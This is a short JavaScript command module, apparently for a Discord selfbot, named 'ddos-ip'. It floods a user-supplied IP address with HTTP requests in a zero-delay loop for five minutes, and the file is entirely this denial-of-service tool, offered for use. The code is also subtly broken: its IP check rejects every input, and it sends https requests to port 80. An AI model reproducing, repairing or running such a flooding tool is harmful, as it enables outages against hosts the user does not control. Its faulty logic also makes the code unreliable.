const fetch = require("node-fetch")

const fs = require('fs')

module.exports = {
    name: "ddos-ip",
    descriptionfr: "DDOS une ip",
    descriptionen: "DDOS an ip",
    run: async (client, message, args, config) => {
        if (!args[0] || !args[0].includes(".") || !args[0].split(".")?.length !== 4)
        return message.edit(client.trad("Veuillez entrer une ip valide", "Please enter a valid ip"))
        
          message.edit(client.trad("Lancement du DDOS", "DDOS starting"))
          const i = setInterval(() => fetch(`https://${args[0]}:80`).catch(() => false), 0);
        setTimeout(() => clearInterval(i), 1000 * 60 * 5);
    }
}